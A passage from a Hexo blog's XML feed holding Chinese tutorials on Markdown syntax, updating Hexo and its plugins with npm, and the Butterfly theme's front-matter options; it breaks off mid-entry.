Aliquam semper ipsum sit amet velit. Suspendisse id sem consectetuer libero luctus adipiscing.</p><p>列表项目可以包含多个段落，每个项目下的段落都必须缩进 4 个空格或是 1 个制表符：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. This is a list item with two paragraphs. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus. Donec sit amet nisl. Aliquam semper ipsum sit amet velit. 2. Suspendisse id sem consectetuer libero luctus adipiscing.</span><br></pre></td></tr></table></figure><p>效果如下： 1. This is a list item with two paragraphs. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus. Donec sit amet nisl. Aliquam semper ipsum sit amet velit.</span><br></pre></td></tr></table></figure><ol><li>Suspendisse id sem consectetuer libero luctus adipiscing.</li></ol><p>如果你每行都有缩进，看起来会看好很多，当然，再次地，如果你很懒惰，Markdown 也允许：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* This is a list item with two paragraphs. This is the second paragraph in the list item. You&#x27;re only required to indent the first line. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. * Another item in the same list.</span><br></pre></td></tr></table></figure><p>效果不再展示。 此外： <em>如果要在列表项目内放进引用，那 &gt; 就需要缩进，</em> 如果要放代码区块的话，该区块就需要缩进两次，也就是 8 个空格或是 2 个制表符。</p><h3 id="6-表格"><a href="#6-表格" class="headerlink" title="6. 表格"></a>6. 表格</h3><p>示例：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表头|表头|表头 ---|:--:|---: 内容|内容|内容内容|内容|内容第二行分割表头和内容。 - 有一个就行，为了对齐，多加了几个文字默认居左 -两边加：表示文字居中 -右边加：表示文字居右注：原生的语法两边都要用 | 包起来。此处省略</span><br></pre></td></tr></table></figure><p>效果如下： 表头|表头|表头 —|:–:|—: 内容|内容|内容 内容|内容|内容</p><h3 id="7-代码"><a href="#7-代码" class="headerlink" title="7. 代码"></a>7. 代码</h3><p>在Markdown中加入代码块有两种方式： 第一种，只要简单地缩进 4 个空格或是 1 个制表符就可以，</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是一个普通段落：这是一个代码区块。 (当然，前面要有一个空行和前面的文字分隔开)</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>这是一个普通段落：</p><p>第二种方法似乎是更为常用， <strong>单行代码</strong>：代码之间分别用一个反引号包起来即可；</p><p>效果如下： 这里有一句代码<code>代码内容</code>。 <strong>代码块</strong>：代码之间分别用三个反引号（esc键下边）包起来，且两边的反引号单独占一行</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\``` 代码... 代码... 代码... \``` \ 是为了防止转译，实际是没有的。</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>还可以在上面的 ``` 后面注明你的代码类型，可以产生相应的代码高亮。</p><h3 id="8-段落和换行"><a href="#8-段落和换行" class="headerlink" title="8. 段落和换行"></a>8. 段落和换行</h3><p>一个 Markdown 段落是由一个或多个连续的文本行组成，它的前后要有一个以上的空行（空行的定义是显示上看起来像是空的，便会被视为空行。比方说，若某一行只包含空格和制表符，则该行也会被视为空行）。普通段落不该用空格或制表符来缩进。 <strong>我们在两个不同的文字块之间，一定要空行以示区分，不然就会被归入同一文字块中。</strong> Markdown 允许段落内的强迫换行（插入换行符）。 如果想要空一行，在插入处先按入两个以上的空格然后回车，即可。</p><p>但有时也可以使用标记来强制空行和空格，比如需要首行缩进的时候： <em>一个空格大小的表示：\  或 \</em>  两个空格的大小表示：\ 或 \ <em>不换行空格：\ 或 \</em> 强制空行： \  </p><hr><h2 id="二、Markdown纯文本进阶语法"><a href="#二、Markdown纯文本进阶语法" class="headerlink" title="二、Markdown纯文本进阶语法"></a>二、Markdown纯文本进阶语法</h2><p>上面的语法其实基本的写一些东西已经足够用了，但有时候还想要文档看起来更炫一些，这时候需要一些用于排版的进阶语法，实际上，这里用的就是HTML的标签来实现了。</p><h3 id="1-更改字体、大小、颜色"><a href="#1-更改字体、大小、颜色" class="headerlink" title="1. 更改字体、大小、颜色"></a>1. 更改字体、大小、颜色</h3><p>语法：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;font face=&quot;黑体&quot;&gt;我是黑体字&lt;/font&gt; &lt;font face=&quot;微软雅黑&quot;&gt;我是微软雅黑&lt;/font&gt; &lt;font face=&quot;STCAIYUN&quot;&gt;我是华文彩云&lt;/font&gt; &lt;font color=red&gt;我是红色&lt;/font&gt; &lt;font color=#008000&gt;我是绿色&lt;/font&gt; &lt;font color=Blue&gt;我是蓝色&lt;/font&gt; &lt;font size=5&gt;我是尺寸&lt;/font&gt; &lt;font face=&quot;黑体&quot; color=green size=5&gt;我是黑体，绿色，尺寸为5&lt;/font&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><blockquote><p>我是黑体字 我是微软雅黑 我是华文彩云 我是红色 我是绿色 我是蓝色 我是尺寸 我是黑体，绿色，尺寸为5  </p></blockquote><h3 id="2-为文字添加背景色"><a href="#2-为文字添加背景色" class="headerlink" title="2. 为文字添加背景色"></a>2. 为文字添加背景色</h3><p>由于 style 标签和标签的 style 属性不被支持，所以这里只能是借助 table, tr, td 等表格标签的 bgcolor 属性来实现背景色。故这里对于文字背景色的设置，只是将那一整行看作一个表格，更改了那个格子的背景色（bgcolor）。 语法：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;背景色yellow&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><blockquote><p>背景色yellow  </p></blockquote><h3 id="3-设置文字居中"><a href="#3-设置文字居中" class="headerlink" title="3. 设置文字居中"></a>3. 设置文字居中</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;center&gt;居中&lt;/center&gt; &lt;p align=&quot;left&quot;&gt;左对齐&lt;/p&gt; &lt;p align=&quot;right&quot;&gt;右对齐&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><blockquote><p>居中 左对齐<br>右对齐</p></blockquote><h3 id="4-加入上下标"><a href="#4-加入上下标" class="headerlink" title="4. 加入上下标"></a>4. 加入上下标</h3><p>使用HTML中下标下标的语法即可, 语法：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H&lt;sub&gt;2&lt;/sub&gt;O CO&lt;sub&gt;2&lt;/sub&gt; 爆米&lt;sup&gt;TM&lt;/sup&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><blockquote><p>H2O CO2 爆米TM  </p></blockquote><hr><h2 id="三、Markdown进阶使用"><a href="#三、Markdown进阶使用" class="headerlink" title="三、Markdown进阶使用"></a>三、Markdown进阶使用</h2><p>有时候在用Markdown时，我们不止要使用纯文本，还需要插入一些图片，链接等等，由于Markdown只是关注于纯文本，因此这些操作都要通过引用来完成，不像word里面简单的复制粘贴。</p><h3 id="1-超链接"><a href="#1-超链接" class="headerlink" title="1. 超链接"></a>1. 超链接</h3><p>Markdown 支持两种形式的链接语法： 行内式和参考式两种形式。</p><p>不管是哪一种，链接文字都是用 [方括号] 来标记。</p><p>要建立一个<strong>行内式</strong>的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，注意方括号和圆括号之间一定不能有空格，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可，例如：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is [an example](http://example.com/ &quot;Title&quot;) inline link. [This link](http://example.net/) has no title attribute.</span><br></pre></td></tr></table></figure><p>效果如下： This is <a href="https://link.zhihu.com/?target=http://example.com/">an example</a> inline link.</p><p><a href="https://link.zhihu.com/?target=http://example.net/">This link</a> has no title attribute.</p><p><em>注：如果想要在新页面中打开的话可以用html语言的a标签代替。</em></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;超链接地址&quot; target=&quot;_blank&quot;&gt;超链接名&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>效果如下： <a href="https://zhuanlan.zhihu.com/%E8%B6%85%E9%93%BE%E6%8E%A5%E5%9C%B0%E5%9D%80">超链接名</a></p><p><strong>参考式</strong>的链接是在链接文字的括号后面再接上另一个方括号，而在第二个方括号里面要填入用以辨识链接的标记：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is [an example][id] reference-style link.</span><br></pre></td></tr></table></figure><p>接着，在文件的任意处，你可以把这个标记的链接内容定义出来:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[id]: http://example.com/ &quot;Optional Title Here&quot;</span><br></pre></td></tr></table></figure><p>链接内容的形式为： <em>方括号（前面可以选择性地加上至多三个空格来缩进），里面输入链接文字</em> 接着一个冒号 <em>接着一个以上的空格或制表符</em> 接着链接的网址 <em>选择性地接着 title 内容，可以用单引号、双引号或是括弧包着</em> 链接网址也可以用尖括号包起来：<code>[id]: &lt;http://example.com/&gt; &quot;Optional Title Here&quot;</code></p><p>链接辨别标签可以有字母、数字、空白和标点符号，但是并不区分大小写。</p><p>链接的定义可以放在文件中的任何一个地方，我比较偏好直接放在链接出现段落的后面，你也可以把它放在文件最后面，就像是注解一样。</p><p>此外，用这个方法还可以将图片转化为base64编码保存在.md文件中，这将在插入图片中介绍。</p><p>下面是一个参考式链接的范例：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I get 10 times more traffic from [Google] [1] than from [Yahoo] [2] or [MSN] [3]. [1]: http://google.com/ &quot;Google&quot; [2]: http://search.yahoo.com/ &quot;Yahoo Search&quot; [3]: http://search.msn.com/ &quot;MSN Search&quot;</span><br></pre></td></tr></table></figure><p>还可以直接用链接名称的方式写：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I get 10 times more traffic from [Google][] than from [Yahoo][] or [MSN][]. [google]: http://google.com/ &quot;Google&quot; [yahoo]: http://search.yahoo.com/ &quot;Yahoo Search&quot; [msn]: http://search.msn.com/ &quot;MSN Search&quot;</span><br></pre></td></tr></table></figure><p><em>要知道，参考式的链接其实重点不在于它比较好写，而是它比较好读。 使用 Markdown 的参考式链接，可以让文件更像是浏览器最后产生的结果，让你可以把一些标记相关的元数据移到段落文字之外，你就可以增加链接而不让文章的阅读感觉被打断。</em></p><h3 id="2-自动链接"><a href="#2-自动链接" class="headerlink" title="2. 自动链接"></a>2. 自动链接</h3><p>除了上面的超链接方式，Markdown 还支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用尖括号包起来， Markdown 就会自动把它转成链接。 语法：</p><p>效果如下：</p><p><a href="https://link.zhihu.com/?target=http://example.com/">http://example.com/</a></p><h3 id="3-插入图片"><a href="#3-插入图片" class="headerlink" title="3. 插入图片"></a>3. 插入图片</h3><p>很明显地，要在纯文字应用中设计一个「自然」的语法来插入图片是有一定难度的。 Markdown 使用一种和链接很相似的语法来标记图片，同样也允许两种样式： <strong>行内式</strong>和<strong>参考式</strong>。</p><p><strong>行内式</strong>的图片语法看起来像是：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![Alt pic](/path/to/img.jpg) ![Alt pic](/path/to/img.jpg &quot;Optional title&quot;)</span><br></pre></td></tr></table></figure><p>详细叙述如下： <em>一个惊叹号 !</em> 接着一个方括号，里面放上图片的替代文字 * 接着一个普通括号，里面放上图片的网址或本地路径（可以是相对路径或绝对路径），最后还可以用引号包住并加上 选择性的 ‘标题’ 文字。</p><p><strong>参考式</strong>的图片语法则长得像这样：</p><p>「id」是图片参考的名称，图片参考的定义方式则和连结参考一样：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[id]: url/to/image &quot;Optional title attribute&quot;</span><br></pre></td></tr></table></figure><p><strong>但是在这里有两个很大的问题：</strong> 1. 如果使用本地路径插入本地图片，不灵活不好分享，本地图片的路径更改或丢失都会造成markdown文件调不出图。 2. 插入网络图片，则非常依赖网络，如果是本地图片，还需要先上传到网络服务器上。</p><p><strong>所以，如果你想上传本地图片，这里我也列出两个解决方法，这也是我查了很多文章总结的，这里欢迎大家来补充指教：</strong></p><h3 id="1-将本地图片上传到github"><a href="#1-将本地图片上传到github" class="headerlink" title="1. 将本地图片上传到github"></a>1. 将本地图片上传到github</h3><p>首先在github中新建一个repo，然后git clone下来，然后把你想要的图片放到这个文件夹中然后上传，然后到GitHub中找到这个图片查看地址，在markdown中引用就好了。</p><p>这种方法的<strong>优点</strong>就在于插入式很灵活，github没有墙，你的文章上传到各个平台，图片也都基本不会丢失或找不到，但<strong>缺点</strong>就在于图片的管理很不方便，图片一旦多起来，你的本地仓库将会变得很大，而且你的文章可能涉及很多方面，管理也不方便，不过，也算是一个比较理想的解决方案。</p><h3 id="2-把图片存入markdown文件"><a href="#2-把图片存入markdown文件" class="headerlink" title="2. 把图片存入markdown文件"></a>2. 把图片存入markdown文件</h3><ol><li>用base64转码工具把图片转成一段字符串</li><li>把字符串填到基础格式中链接的那个位置。</li><li>由于图片转成base64编码，会非常的大，一般至少都要上千行，这个时候会发现插入的这一长串字符串会把整个文章分割开，非常影响编写文章时的体验。这时候就可以用<strong>参考式</strong>，把大段的base64字符串放在文章末尾，然后在文章中通过一个id来调用，文章就不会被分割的这么乱了。</li></ol><p>这种方法的<strong>优点</strong>就是图片真的是不会丢啊，相当于直接将图片编码嵌入到文档中，但<strong>缺点</strong>也是显而易见的，就是base64编码实在是太长了啊，太长了，虽然可以放到文章结尾，但还是太长了，所以目前我还没找到更好的解决方法。</p><h3 id="4-调整图片格式"><a href="#4-调整图片格式" class="headerlink" title="4. 调整图片格式"></a>4. 调整图片格式</h3><p>到目前为止， Markdown 还没有办法直接指定图片的宽高，如果需要的话，则可以使用普通的 \</p><p>标签。 * 图片位置——居左&#x2F;居中&#x2F;居右</p><p>利用markdown在编写文档时插入图片是默认靠左，有些时候将图片设置为居中时可以更加的美观，这时就需要在图片的信息前边添加如下语句：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div align=center&gt;![Alt pic] (http:...) 如果想将图片位于右侧，只需要将center改为right</span><br></pre></td></tr></table></figure><ul><li>设置图片大小</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http:...&quot; width = &quot;100&quot; height = &quot;100&quot; div align=right /&gt;</span><br></pre></td></tr></table></figure><p>如上格式，在图片的最后添加 width &#x3D; “100” height &#x3D; “100”，就可以设置图片的大小。也可以在后边输入百分比为多少，如 width &#x3D; 20% height &#x3D; 20%， 当然，如果你使用的是base64编码，可以直接将编码放到上面放链接的引号里，也可以设置图片大小，但是放在\</p><p>标签里，貌似就不能作为<strong>参考式</strong>的链接了，所以用base64调整图片大小还是很艰难，也希望大手能指导一下。</p><h3 id="5-LaTeX-公式"><a href="#5-LaTeX-公式" class="headerlink" title="5. LaTeX 公式"></a>5. LaTeX 公式</h3><p>Markdown还有一大优势就是可以支持 LaTeX 的公式。 \$ 表示行内公式 \$$ 表示整行公式 访问 <a href="https://link.zhihu.com/?target=https://math.meta.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference">MathJax</a> 参考更多使用方法。</p><p>这里说一个常用的，很多时候，我们在做笔记时候，需要画箭头，然后在箭头上需要写字，这里就可以用LaTeX公式来实现：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ X\stackrel&#123;F&#125;&#123;\longrightarrow&#125;Y $</span><br></pre></td></tr></table></figure><p>效果如下： $ X\stackrel{F}{\longrightarrow}Y $</p><p>LaTeX 支持多种箭号，内容很丰富,这里就不一一列举了，大家可以参见<a href="https://link.zhihu.com/?target=https://blog.csdn.net/J__Max/article/details/86549124">Latex各种箭号符号</a>。</p><h3 id="6-内容目录"><a href="#6-内容目录" class="headerlink" title="6. 内容目录"></a>6. 内容目录</h3><p>Markdown还有一个很方便的功能，就是可以根据标题自动生成目录。 在段落中填写 <code>[TOC]</code> 以显示全文内容的目录结构</p><p>在最后要说的是，Markdown其实还有很多强大的功能，比如画<strong>流程图、序列图、甘特图、Mermaid 流程图、Mermaid 序列图，</strong> 因为暂时用的比较少，而且上面的语法应该已经足够用了，所以这个就有待我下次再开发把。</p><p>Tips： 1. 用于Markdown语法标记的符号和后面的内容之间一定要加上至少一个空格，以便识别。 2. 在Markdown编辑中，你用「Enter」键来敲空行，最多只能空一行，如果想要在显示中有多行空行的话，则要用HTML标签来实现了。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> Markdown语法 </tag>
            
            <tag> 热门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何更新Hexo及插件的版本？如何更新主题版本？</title>
      <link href="/posts/dabe8c2.html"/>
      <url>/posts/dabe8c2.html</url>
      
        <content type="html"><![CDATA[<p>本来想一个版本一直稳定用下去的，但是今天看到主题的版本更新修复了BUG。。。这能不更新吗？所以抄起家伙开始更新了！</p><h2 id="更新主题"><a href="#更新主题" class="headerlink" title="更新主题"></a><a href="https://blog.zhheo.com/p/6d1f1f98.html#%E6%9B%B4%E6%96%B0%E4%B8%BB%E9%A2%98" title="更新主题"></a>更新主题</h2><p>使用Butterfly主题可以根据主题的更新说明中进行操作。</p><p>[</p><p>引用站外地址，不保证站点的可用性和安全性</p><p>](<a href="https://demo.jerryc.me/posts/21cfbf15/#%E5%8D%87%E7%B4%9A%E5%BB%BA%E8%AD%B0">https://demo.jerryc.me/posts/21cfbf15/#%E5%8D%87%E7%B4%9A%E5%BB%BA%E8%AD%B0</a> “升级建议”)</p><h2 id="自动更新"><a href="#自动更新" class="headerlink" title="自动更新"></a><a href="https://blog.zhheo.com/p/6d1f1f98.html#%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0" title="自动更新"></a>自动更新</h2><h3 id="使用cd命令进入博客根目录"><a href="#使用cd命令进入博客根目录" class="headerlink" title="使用cd命令进入博客根目录"></a><a href="https://blog.zhheo.com/p/6d1f1f98.html#%E4%BD%BF%E7%94%A8cd%E5%91%BD%E4%BB%A4%E8%BF%9B%E5%85%A5%E5%8D%9A%E5%AE%A2%E6%A0%B9%E7%9B%AE%E5%BD%95" title="使用cd命令进入博客根目录"></a>使用cd命令进入博客根目录</h3><p>常规操作，不做解释</p><h3 id="更新插件和Hexo版本"><a href="#更新插件和Hexo版本" class="headerlink" title="更新插件和Hexo版本"></a><a href="https://blog.zhheo.com/p/6d1f1f98.html#%E6%9B%B4%E6%96%B0%E6%8F%92%E4%BB%B6%E5%92%8CHexo%E7%89%88%E6%9C%AC" title="更新插件和Hexo版本"></a>更新插件和Hexo版本</h3><p><code>npm update</code></p><h2 id="手动更新"><a href="#手动更新" class="headerlink" title="手动更新"></a><a href="https://blog.zhheo.com/p/6d1f1f98.html#%E6%89%8B%E5%8A%A8%E6%9B%B4%E6%96%B0" title="手动更新"></a>手动更新</h2><h3 id="使用cd命令进入博客根目录-1"><a href="#使用cd命令进入博客根目录-1" class="headerlink" title="使用cd命令进入博客根目录"></a><a href="https://blog.zhheo.com/p/6d1f1f98.html#%E4%BD%BF%E7%94%A8cd%E5%91%BD%E4%BB%A4%E8%BF%9B%E5%85%A5%E5%8D%9A%E5%AE%A2%E6%A0%B9%E7%9B%AE%E5%BD%95-1" title="使用cd命令进入博客根目录"></a>使用cd命令进入博客根目录</h3><p>常规操作，不做解释</p><h3 id="检查插件更新"><a href="#检查插件更新" class="headerlink" title="检查插件更新"></a><a href="https://blog.zhheo.com/p/6d1f1f98.html#%E6%A3%80%E6%9F%A5%E6%8F%92%E4%BB%B6%E6%9B%B4%E6%96%B0" title="检查插件更新"></a>检查插件更新</h3><p><code>npm outdated</code></p><p>运行后可以检查Hexo和插件的最新版本</p><p><a href="https://p.zhheo.com/15974200527778a3jawy3.png!blogimg"><img src= "" data-lazy-src="https://p.zhheo.com/15974200527778a3jawy3.png!blogimg"></a></p><h3 id="更改版本文件"><a href="#更改版本文件" class="headerlink" title="更改版本文件"></a><a href="https://blog.zhheo.com/p/6d1f1f98.html#%E6%9B%B4%E6%94%B9%E7%89%88%E6%9C%AC%E6%96%87%E4%BB%B6" title="更改版本文件"></a>更改版本文件</h3><p>修改根目录的<code>package.json</code>文件，将对应插件名称所对应的版本号更改为要更新的版本号。</p><p><a href="https://p.zhheo.com/2i5pVD22890181610870428677.png!blogimg"><img src= "" data-lazy-src="https://bu.dusays.com/2023/03/03/6401a7902b8de.png"></a></p><h3 id="开始更新"><a href="#开始更新" class="headerlink" title="开始更新"></a><a href="https://blog.zhheo.com/p/6d1f1f98.html#%E5%BC%80%E5%A7%8B%E6%9B%B4%E6%96%B0" title="开始更新"></a>开始更新</h3><p><code>npm install --save</code></p><h3 id="查看当前版本号"><a href="#查看当前版本号" class="headerlink" title="查看当前版本号"></a><a href="https://blog.zhheo.com/p/6d1f1f98.html#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%89%88%E6%9C%AC%E5%8F%B7" title="查看当前版本号"></a>查看当前版本号</h3><p><code>hexo version</code></p><p><a href="https://p.zhheo.com/1597420291765ok5lonkx.png!blogimg"><img src= "" data-lazy-src="https://bu.dusays.com/2023/03/03/6401a7902b8de.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Butterfly 安裝文檔(二) 主題頁面  Butterfly</title>
      <link href="/posts/5372cc32.html"/>
      <url>/posts/5372cc32.html</url>
      
        <content type="html"><![CDATA[<h2 id="Front-matter"><a href="#Front-matter" class="headerlink" title="Front-matter"></a><a href="https://butterfly.js.org/posts/dc584b87/#Front-matter" title="Front-matter"></a>Front-matter</h2><p><strong>Front-matter 是 markdown 文件最上方以 <code>---</code> 分隔的区域，用于指定个别档案的变数。</strong></p><ul><li>Page Front-matter 用于<code>页面</code>配置</li><li>Post Front-matter 用于<code>文章页</code>配置</li></ul><p>如果标注<code>可选</code>的参数，可根据自己需要添加，不用全部都写在 markdown 里</p><h3 id="Page-Front-matter"><a href="#Page-Front-matter" class="headerlink" title="Page Front-matter"></a><a href="https://butterfly.js.org/posts/dc584b87/#Page-Front-matter" title="Page Front-matter"></a>Page Front-matter</h3><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></pre></td><td><pre><span>---</span><br><span>title:</span><br><span>date:</span><br><span>updated:</span><br><span>type:</span><br><span>comments:</span><br><span>description:</span><br><span>keywords:</span><br><span>top<span>_img:</span></span><br><span><span>mathjax:</span></span><br><span><span>katex:</span></span><br><span><span>aside:</span></span><br><span><span>aplayer:</span></span><br><span><span>highlight_</span>shrink:</span><br><span><span>random:</span></span><br><span><span>---</span></span><br></pre></td></tr></tbody></table><table><thead><tr><th>写法</th><th>解释</th></tr></thead><tbody><tr><td>title</td><td>【必需】页面标题</td></tr><tr><td>date</td><td>【必需】页面创建日期</td></tr><tr><td>type</td><td>【必需】标签、分类和友情链接三个页面需要配置</td></tr><tr><td>updated</td><td>【可选】页面更新日期</td></tr><tr><td>description</td><td>【可选】页面描述</td></tr><tr><td>keywords</td><td>【可选】页面关键字</td></tr><tr><td>comments</td><td>【可选】显示页面评论模块 (默认 true)</td></tr><tr><td>top_img</td><td>【可选】页面顶部图片</td></tr><tr><td>mathjax</td><td>【可选】显示mathjax (当设置mathjax的per_page: false时，才需要配置，默认 false)</td></tr><tr><td>katex</td><td>【可选】显示katex (当设置katex的per_page: false时，才需要配置，默认 false)</td></tr><tr><td>aside</td><td>【可选】显示侧边栏 (默认 true)</td></tr><tr><td>aplayer</td><td>【可选】在需要的页面加载aplayer的js和css,请参考文章下面的<code>音乐</code> 配置</td></tr><tr><td>highlight_shrink</td><td>【可选】配置代码框是否展开 (true&#x2F;false) (默认为设置中highlight_shrink的配置)</td></tr><tr><td>random</td><td>【可选】配置友情链接是否随机排序（默认为 false)</td></tr></tbody></table><h3 id="Post-Front-matter"><a href="#Post-Front-matter" class="headerlink" title="Post Front-matter"></a><a href="https://butterfly.js.org/posts/dc584b87/#Post-Front-matter" title="Post Front-matter"></a>Post Front-matter</h3><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></pre></td><td><pre><span>---</span><br><span>title:</span><br><span>date:</span><br><span>updated:</span><br><span>tags:</span><br><span>categories:</span><br><span>keywords:</span><br><span>description:</span><br><span>top<span>_img:</span></span><br><span><span>comments:</span></span><br><span><span>cover:</span></span><br><span><span>toc:</span></span><br><span><span>toc_</span>number:</span><br><span>toc<span>_style_</span>simple:</span><br><span>copyright:</span><br><span>copyright<span>_author:</span></span><br><span><span>copyright_</span>author<span>_href:</span></span><br><span><span>copyright_</span>url:</span><br><span>copyright<span>_info:</span></span><br><span><span>mathjax:</span></span><br><span><span>katex:</span></span><br><span><span>aplayer:</span></span><br><span><span>highlight_</span>shrink:</span><br><span>aside:</span><br><span><span>abcjs:</span></span><br><span><span>---</span></span><br></pre></td></tr></tbody></table><table><thead><tr><th>写法</th><th>解释</th></tr></thead><tbody><tr><td>title</td><td>【必需】文章标题</td></tr><tr><td>date</td><td>【必需】文章创建日期</td></tr><tr><td>updated</td><td>【可选】文章更新日期</td></tr><tr><td>tags</td><td>【可选】文章标签</td></tr><tr><td>categories</td><td>【可选】文章分类</td></tr><tr><td>keywords</td><td>【可选】文章关键字</td></tr><tr><td>description</td><td>【可选】文章描述</td></tr><tr><td>top_img</td><td>【可选】文章顶部图片</td></tr><tr><td>cover</td><td>【可选】文章缩略图(如果没有设置top_img,文章页顶部将显示缩略图，可设为false&#x2F;图片地址&#x2F;留空)</td></tr><tr><td>comments</td><td>【可选】显示文章评论模块(默认 true)</td></tr><tr><td>toc</td><td>【可选】显示文章TOC(默认为设置中toc的enable配置)</td></tr><tr><td>toc_number</td><td>【可选】显示toc_number(默认为设置中toc的number配置)</td></tr><tr><td>toc_style_simple</td><td>【可选】显示 toc 简洁模式</td></tr><tr><td>copyright</td><td>【可选】显示文章版权模块(默认为设置中post_copyright的enable配置)</td></tr><tr><td>copyright_author</td><td>【可选】文章版权模块的<code>文章作者</code></td></tr><tr><td>copyright_author_href</td><td>【可选】文章版权模块的<code>文章作者</code>链接</td></tr><tr><td>copyright_url</td><td>【可选】文章版权模块的<code>文章连结</code>链接</td></tr><tr><td>copyright_info</td><td>【可选】文章版权模块的<code>版权声明</code>文字</td></tr><tr><td>mathjax</td><td>【可选】显示mathjax(当设置 mathjax 的 per_page: false 时，才需要配置，默认 false )</td></tr><tr><td>katex</td><td>【可选】显示 katex (当设置 katex 的 per_page: false 时，才需要配置，默认 false )</td></tr><tr><td>aplayer</td><td>【可选】在需要的页面加载 aplayer 的 js 和 css,请参考文章下面的<code>音乐</code> 配置</td></tr><tr><td>highlight_shrink</td><td>【可选】配置代码框是否展开(true&#x2F;false)(默认为设置中 highlight_shrink 的配置)</td></tr><tr><td>aside</td><td>【可选】显示侧边栏 (默认 true)</td></tr><tr><td>abcjs</td><td>【可选】加载 abcjs (当设置 abcjs 的 per_page: false 时，才需要配置，默认 false )</td></tr></tbody></table><h2 id="标签页"><a href="#标签页" class="headerlink" title="标签页"></a><a href="https://butterfly.js.org/posts/dc584b87/#%E6%A8%99%E7%B1%A4%E9%A0%81" title="标签页"></a>标签页</h2><ol><li><p>前往你的 Hexo 博客的根目录</p></li><li><p>输入 <code>hexo new page tags</code></p></li><li><p>你会找到 <code>source/tags/index.md</code> 这个文件</p></li><li><p>修改这个文件：</p><p><strong>记得添加 <code>type: &quot;tags&quot;</code></strong></p></li></ol><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></pre></td><td><pre><span>---</span><br><span>title: 标签</span><br><span>date: 2018-01-05 00:00:00</span><br><span>type: 